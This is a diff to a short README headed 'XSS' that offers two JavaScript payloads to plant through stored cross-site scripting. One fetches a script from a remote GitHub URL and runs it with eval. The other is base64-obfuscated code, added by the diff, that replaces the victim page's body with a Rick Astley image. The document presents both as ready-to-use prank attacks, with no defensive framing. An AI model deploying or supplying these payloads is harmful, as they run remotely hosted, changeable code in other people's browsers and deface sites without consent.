@@ -1,3 +1,5 @@
 # XSS
 
-Put `eval(await (await fetch("https://raw.githubusercontent.com/luxterful/nevergonnagiveyouup/master/script.js")).text())` into persistant XSS and see the magic
+Put `eval(await (await fetch("https://raw.githubusercontent.com/luxterful/nevergonnagiveyouup/master/script.js")).text())` into persistant XSS and see the magic.
+
+`eval(atob("Y29uc3QgaW1nPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2ltZycpO2ltZy5zZXRBdHRyaWJ1dGUoJ3NyYycsJ2h0dHBzOi8vdXBsb2FkLndpa2ltZWRpYS5vcmcvd2lraXBlZGlhL2NvbW1vbnMvMS8xMy9JYS1uZXZlci1nb25uYS1naXZlLXlvdS11cC1yaWNrLWFzdGxleS10cmlvbmZhbGUtcmVtYXN0ZXItNGstdjMtNTAwNDIxLmpwZycpLGltZy5zdHlsZS5tYXhXaWR0aD0nMTAwJScsZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2JvZHknKVswXS5yZXBsYWNlV2l0aChpbWcpOw=="))`
